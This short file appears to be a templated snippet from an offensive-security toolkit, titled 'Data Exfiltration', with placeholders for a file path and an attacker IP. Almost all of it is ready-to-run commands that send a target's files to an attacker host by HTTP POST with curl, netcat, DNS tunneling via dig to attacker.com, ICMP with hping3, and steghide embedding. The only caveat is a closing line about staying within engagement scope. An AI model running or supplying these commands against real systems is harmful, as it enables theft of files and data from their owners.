name: Data Exfiltration
content:
Exfiltrate {file_path} to {attacker_ip}.

**HTTP/HTTPS :**
```bash
# Server (attacker)
python3 -m http.server 8080

# Client (target)
curl -X POST -F "file=@{file_path}" http://{attacker_ip}:8080/upload
```

**Netcat :**
```bash
# Attacker
nc -lvnp 4444 > exfil.txt

# Target
cat {file_path} | nc {attacker_ip} 4444
```

**DNS tunneling :**
```bash
# Encode as base64 and send through DNS
cat {file_path} | base64 | xxd -p | xargs -I {} dig {}.attacker.com
```

**ICMP :**
```bash
# With hping3
hping3 -c 1 -E {file_path} -d 100 {attacker_ip}
```

**Steganography :**
```bash
steghide embed -cf image.jpg -ef {file_path}
```

⚠️ Verify that exfiltration is authorized within the engagement scope.
